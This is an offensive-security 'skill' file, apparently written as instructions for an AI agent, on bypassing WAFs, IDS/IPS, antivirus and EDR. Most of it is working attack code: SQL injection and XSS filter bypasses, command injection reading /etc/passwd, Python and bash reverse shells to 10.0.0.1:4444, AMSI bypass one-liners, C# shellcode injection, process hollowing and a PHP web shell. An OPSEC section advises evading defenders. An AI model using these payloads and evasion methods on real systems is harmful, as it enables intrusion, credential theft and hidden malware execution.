---
name: system-injection-bypass
description: Bypass WAF, IDS/IPS, AV, EDR, and application input filters
version: 1.0.0
author: harezadmm
tags: [bypass, waf, evasion, ids, ips, filter, security]
---

# System Injection & Bypass Techniques

## When to Use
Bypassing security controls: WAF (Web Application Firewall), IDS/IPS (Intrusion Detection/Prevention), antivirus, EDR (Endpoint Detection and Response), input validation filters.

## Prerequisites
- Understanding of target security system
- Knowledge of attack payloads (SQLi, XSS, command injection)
- Ability to test and iterate
- Target system to test against

## Bypass Categories

### 1. WAF Bypass
Evade ModSecurity, Cloudflare, Imperva, AWS WAF.

### 2. SQL Injection Filter Bypass
Evade blacklists, parameterized query escapes.

### 3. XSS Filter Bypass
Bypass HTML sanitizers, CSP, XSS Auditor.

### 4. Command Injection Bypass
Evade shell command blacklists.

### 5. Antivirus/EDR Evasion
Bypass signature detection, behavioral analysis.

### 6. IDS/IPS Evasion
Evade Snort, Suricata network monitoring.

## Procedure

### Step 1: WAF Bypass Techniques

**Case manipulation:**
```sql
-- Standard payload
' OR 1=1--

-- Bypasses
' oR 1=1--
' Or 1=1--
' OR 1=1--
' /**/OR/**/1=1--
```

**Comment injection:**
```sql
-- Standard
SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admin

-- Bypassed
SELECT * FROM users WHERE id = 1/**/UNION/**/SELECT/**/password/**/FROM/**/admin
SELECT * FROM users WHERE id = 1/*!UNION*//*!SELECT*/password/*!FROM*/admin
SELECT * FROM users WHERE id = 1%0aUNION%0aSELECT%0apassword%0aFROM%0aadmin
```

**Encoding bypass:**
```bash
# URL encoding
%27%20OR%201=1--

# Double URL encoding
%2527%2520OR%25201=1--

# Unicode encoding
\u0027 OR 1=1--

# HTML encoding
&#39; OR 1=1--

# Hex encoding
0x27 OR 1=1--

# Base64
' OR 1=1-- encoded then decoded by app
```

**HTTP parameter pollution:**
```bash
# Send duplicate parameters
?id=1&id=' OR 1=1--

# Different parameter names parsed differently
?id=1&ID=' OR 1=1--

# Array syntax
?id[]=1&id[]=' OR 1=1--
```

**HTTP verb tampering:**
```bash
# If WAF only checks GET/POST
curl -X PUT https://target.com/api/users?id=1' OR 1=1--
curl -X DELETE https://target.com/api/users?id=1' OR 1=1--
curl -X PATCH https://target.com/api/users?id=1' OR 1=1--
```

**Content-Type bypass:**
```bash
# JSON injection instead of form data
curl -X POST https://target.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin", "password":"\" OR \"1\"=\"1"}'

# XML injection
curl -X POST https://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><id>1 UNION SELECT password FROM admin</id></user>'
```

**Chunked encoding:**
```python
import requests

# Split payload across chunked transfer encoding
payload = "' OR 1=1--"

headers = {
    'Transfer-Encoding': 'chunked',
    'Content-Type': 'application/x-www-form-urlencoded'
}

# Manually craft chunked body
chunks = []
for i in range(0, len(payload), 2):
    chunk = payload[i:i+2]
    chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
chunks.append("0\r\n\r\n")

body = ''.join(chunks)

# Some WAFs don't parse chunked properly
response = requests.post(
    'https://target.com/search',
    headers=headers,
    data=body
)
```

**Cloudflare-specific bypass:**
```bash
# Direct origin IP (bypass Cloudflare)
curl -H "Host: target.com" http://ORIGIN_IP/path

# Use Cloudflare's own services
curl https://target.com/cdn-cgi/trace

# Bypass via subdomain without Cloudflare
curl https://direct.target.com/path

# HTTP/2 smuggling
curl --http2 https://target.com/path -H "Transfer-Encoding: chunked"
```

### Step 2: Advanced SQL Injection Bypass

**Whitespace alternatives:**
```sql
-- Standard space
SELECT * FROM users

-- Bypasses
SELECT/**//**/FROM/**/users
SELECT%09*%09FROM%09users  -- Tab
SELECT%0A*%0AFROM%0Ausers  -- Newline
SELECT%0D*%0DFROM%0Dusers  -- Carriage return
SELECT%A0*%A0FROM%A0users  -- Non-breaking space
SELECT+*+FROM+users        -- Plus sign
```

**String concatenation:**
```sql
-- Standard
admin

-- Bypasses (MySQL)
CONCAT('ad','min')
'ad'||'min'
'ad'+'min'
CONCAT_WS('','ad','min')

-- Bypasses (MSSQL)
'ad'+'min'
CONCAT('ad','min')

-- Bypasses (PostgreSQL)
'ad'||'min'
CONCAT('ad','min')

-- Bypasses (Oracle)
'ad'||'min'
CONCAT('ad','min')
```

**Function alternatives:**
```sql
-- Standard: WHERE username = 'admin'

-- MySQL alternatives
WHERE username = CHAR(97,100,109,105,110)
WHERE username = 0x61646d696e
WHERE HEX(username) = HEX('admin')
WHERE username REGEXP 'admin'
WHERE username LIKE 'admin'

-- MSSQL alternatives
WHERE username = CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
WHERE UNICODE(username) = UNICODE('admin')

-- PostgreSQL alternatives
WHERE username = CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
WHERE username ~ 'admin'
```

**Boolean-based blind bypass:**
```sql
-- Standard
' AND 1=1--

-- Time-based (no output needed)
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; WAITFOR DELAY '0:0:5'--
' AND pg_sleep(5)--

-- Error-based
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--
```

**WAF bypass with scientific notation:**
```sql
-- Standard
' OR 1=1--

-- Scientific notation bypass
' OR 1e0=1e0--
' OR 1.=.1--
' OR 0x1=0x1--
```

### Step 3: XSS Filter Bypass

**HTML encoding variations:**
```html
<!-- Standard -->
<script>alert(1)</script>

<!-- Bypasses -->
<sCrIpT>alert(1)</sCrIpT>
<script>alert(1)</script>
<script>&#97;lert(1)</script>
<script>\u0061lert(1)</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

**Event handler alternatives:**
```html
<!-- If <script> blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
```

**JavaScript execution without parentheses:**
```javascript
// Standard
alert(1)

// Bypasses
alert`1`
window['alert']`1`
eval`alert\x281\x29`
throw/**/onerror=alert,1
```

**Filter bypass with JSFuck:**
```javascript
// Original
alert(1)

// JSFuck (only []!+ characters)
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

**Mutation XSS (mXSS):**
```html
<!-- Browser parses HTML differently than sanitizer -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Template injection -->
<template><img src=x onerror=alert(1)></template>

<!-- SVG CDATA -->
<svg><![CDATA[><img src=x onerror=alert(1)>]]></svg>
```

**CSP bypass:**
```javascript
// If CSP allows 'unsafe-eval'
eval('alert(1)')
new Function('alert(1)')()
setTimeout('alert(1)',0)

// If CSP allows external scripts from whitelisted domain
<script src="https://whitelisted-cdn.com/jsonp?callback=alert"></script>

// Dangling markup injection
<img src='https://attacker.com/log?
(rest of page content gets sent as URL parameter)
```

### Step 4: Command Injection Bypass

**Command separators:**
```bash
# Standard
; ls

# Alternatives
| ls
|| ls
& ls
&& ls
%0a ls  # Newline
`ls`
$(ls)
```

**Space alternatives:**
```bash
# Standard
cat /etc/passwd

# Bypasses
cat</etc/passwd
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```

**Keyword bypass:**
```bash
# If "cat" is blacklisted
ca\t /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd
c${x}at /etc/passwd
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)  # cat /etc/passwd

# Alternative commands
less /etc/passwd
more /etc/passwd
tail /etc/passwd
head /etc/passwd
nl /etc/passwd
xxd /etc/passwd
```

**Wildcard injection:**
```bash
# If input is used in shell command
# User input: -rf *
rm -f user_input_here

# Becomes
rm -f -rf *  # Deletes everything!

# Bypass argument injection
touch -- '-rf *'
```

### Step 5: Antivirus/EDR Evasion

**Python payload obfuscation:**
```python
# Standard reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])

# Obfuscated version
import socket,subprocess,os;
__import__('socket').socket(__import__('socket').AF_INET,__import__('socket').SOCK_STREAM).connect(("10.0.0.1",4444));
[os.dup2(__import__('socket').socket().fileno(),i) for i in range(3)];
__import__('subprocess').call(["/bin/sh","-i"])

# Base64 encoded
import base64
exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9z...'))

# Encrypted payload
from cryptography.fernet import Fernet
key = b'key_here'
encrypted = b'encrypted_payload_here'
exec(Fernet(key).decrypt(encrypted))
```

**PowerShell AMSI bypass:**
```powershell
# AMSI (Antimalware Scan Interface) bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated version
$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([char]65+[char]109+[char]115+[char]105)+[char]85+'tils');$b=$a.GetField($([char]97+[char]109+[char]115+[char]105)+'InitFailed','NonPublic,Static');$b.SetValue($null,$true)

# Alternative bypass
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
```

**C# AV evasion techniques:**
```csharp
using System;
using System.Runtime.InteropServices;

class Program {
    // XOR encrypt payload
    static byte[] Decrypt(byte[] cipher, byte key) {
        byte[] decrypted = new byte[cipher.Length];
        for (int i = 0; i < cipher.Length; i++) {
            decrypted[i] = (byte)(cipher[i] ^ key);
        }
        return decrypted;
    }
    
    // Inject shellcode
    [DllImport("kernel32")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    static void Main() {
        // Encrypted payload (calc.exe shellcode)
        byte[] encrypted = new byte[] { /* XOR encrypted shellcode */ };
        byte[] shellcode = Decrypt(encrypted, 0xAA);
        
        // Allocate memory
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
        
        // Copy shellcode
        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
        
        // Execute
        CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        
        System.Threading.Thread.Sleep(10000);
    }
}
```

**Process hollowing (EDR bypass):**
```csharp
// Create suspended process
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
CreateProcess(null, "svchost.exe", null, null, false, 0x4, null, null, ref si, out pi);

// Unmap original image
ZwUnmapViewOfSection(pi.hProcess, GetBaseAddress(pi.hProcess));

// Write malicious payload
VirtualAllocEx(pi.hProcess, GetBaseAddress(pi.hProcess), payloadSize, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, GetBaseAddress(pi.hProcess), payload, payloadSize, out bytesWritten);

// Resume execution
ResumeThread(pi.hThread);
```

### Step 6: IDS/IPS Evasion

**Packet fragmentation:**
```bash
# Nmap with fragmentation
nmap -f target.com  # 8-byte fragments
nmap --mtu 16 target.com  # Custom MTU

# Slow scan to evade rate limiting
nmap -T1 target.com  # Paranoid timing
```

**Protocol manipulation:**
```python
from scapy.all import *

# TCP source port 80 (looks like HTTP response)
ip = IP(dst="target.com")
tcp = TCP(sport=80, dport=22, flags="S")
send(ip/tcp)

# Invalid checksum (some IDS skip verification)
ip = IP(dst="target.com", chksum=0xBAD)
tcp = TCP(sport=12345, dport=80, flags="S")
send(ip/tcp)

# Overlapping fragments
send(fragment(IP(dst="target.com")/TCP()/"malicious payload"))
```

**Encoding payloads:**
```bash
# URL encode
echo -n "<?php system(\$_GET['cmd']); ?>" | xxd -p | sed 's/../%&/g'

# Base64 encode
echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" | base64

# Gzip compress
echo "payload" | gzip | base64
```

## Pitfalls

**Over-obfuscation**: Too much encoding breaks payloads.

**Context matters**: XSS bypass in HTML won't work in JavaScript context.

**Detection updates**: WAF rules evolve, test regularly.

**Performance**: Heavy obfuscation adds latency.

**False sense of security**: Bypass doesn't mean vulnerability exists.

## Verification

```bash
# Test SQL injection bypass
curl "https://target.com/search?q=test'/**/OR/**/1=1--"

# Check XSS bypass
curl "https://target.com/comment" -d "text=<svg/onload=alert(1)>"

# Verify command injection
curl "https://target.com/ping?host=127.0.0.1;whoami"

# Test AV evasion
python malware.py  # Should not trigger AV
```

## OPSEC

- Test in isolated environments first
- Use VPN/proxy when testing live targets
- Rate limit requests to avoid detection
- Rotate payloads and techniques
- Monitor for blue team detection

## References

- OWASP Testing Guide
- PayloadsAllTheThings (GitHub)
- HackTricks book
- PortSwigger Web Security Academy
- AMSI bypass techniques collection
